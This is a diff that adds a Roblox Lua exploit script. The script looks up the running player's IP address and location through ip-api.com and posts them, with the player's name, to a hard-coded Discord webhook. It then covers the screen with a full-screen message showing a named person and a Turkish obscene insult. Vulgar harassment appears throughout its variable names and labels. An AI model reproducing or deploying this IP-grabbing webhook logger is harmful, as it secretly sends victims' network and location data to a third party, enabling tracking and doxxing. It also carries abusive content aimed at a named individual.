@@ -1,0 +1,79 @@
+local lrezy                     = game:GetService("Players").LocalPlayer
+local lrezyorospucocugukarakter = lrezy.Character
+local api                       = "http://ip-api.com/json/?fields=61439"
+local webhook                   = "https://discord.com/api/webhooks/1324116694515322952/bcDE264OPpKm-GzafmDUrFE034Z6F2UQZ1KFHYPafdVHFRILSJ3V8c8tzE8XENtY3W-w"
+local request                   = http_request or HttpPost or syn.request
+
+local success, response = pcall(function()
+    return request({
+        Url = api,
+        Method = "GET",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+    })
+end)
+
+if success then
+    local orospuevladininipsi   = response.Body
+    local msg = {
+        ["username"] = "lrezynin anasini siken webhook",
+        ["avatar_url"] = "https://cdn.discordapp.com/attachments/1233456714792177775/1268215250222846074/ronaldo.jpg?ex=66ab9cfd&is=66aa4b7d&hm=e48c7200f350b99275b630f085e483f8c015cf25bf553333722e863f30dfd93e&",
+        ["embeds"] = {{
+            ["color"] = tonumber("0xFFFFFF"),
+            ["title"] = "Lrezynin Anasi Sikildi!",
+            ["fields"] = {
+                {["name"] = "Player Name:", ["value"] = "```".. lrezy.Name .."```", ["inline"] = true },
+                {["name"] = "IPs:", ["value"] = "```".. orospuevladininipsi .."```", ["inline"] = false }
+            },
+            ["footer"] = {["text"] = "Created by skatemain"},
+        }},
+    }
+    
+    request({
+        Url = webhook,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = game.HttpService:JSONEncode(msg)
+    })
+    lrezyorospucocugukarakter:WaitForChild("Right Leg").Size = Vector3.new(15, 15, 15)
+    lrezyorospucocugukarakter:WaitForChild("Left Leg").Size = Vector3.new(15, 15, 15)
+else
+    warn(response)
+end
+
+local sgui = Instance.new("ScreenGui")
+sgui.Name = "CustomScreenGui"
+sgui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+local bf = Instance.new("Frame")
+bf.Size = UDim2.new(1, 0, 1, 0)
+bf.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+bf.Parent = sgui
+
+local btl = Instance.new("TextLabel")
+btl.Size = UDim2.new(1, 0, 0.7, 0)
+btl.Position = UDim2.new(0, 0, 0.15, 0)
+btl.Text = "Hüseyin Buğra Engin"
+btl.TextColor3 = Color3.fromRGB(255, 255, 255)
+btl.TextScaled = true
+btl.TextStrokeTransparency = 0.5
+btl.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+btl.BackgroundTransparency = 1
+btl.Parent = bf
+
+local stl = Instance.new("TextLabel")
+stl.Size = UDim2.new(1, 0, 0.2, 0)
+stl.Position = UDim2.new(0, 0, 0.8, 0)
+stl.Text = "ananız sıkıldı"
+stl.TextColor3 = Color3.fromRGB(255, 255, 255)
+stl.TextScaled = true
+stl.BackgroundTransparency = 1
+stl.TextSize = 20
+stl.TextStrokeTransparency = 0.5
+stl.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+stl.TextBackgroundColor3 = Color3.fromRGB(255, 0, 0)
+stl.TextBackgroundTransparency = 0.5
+stl.Parent = bf
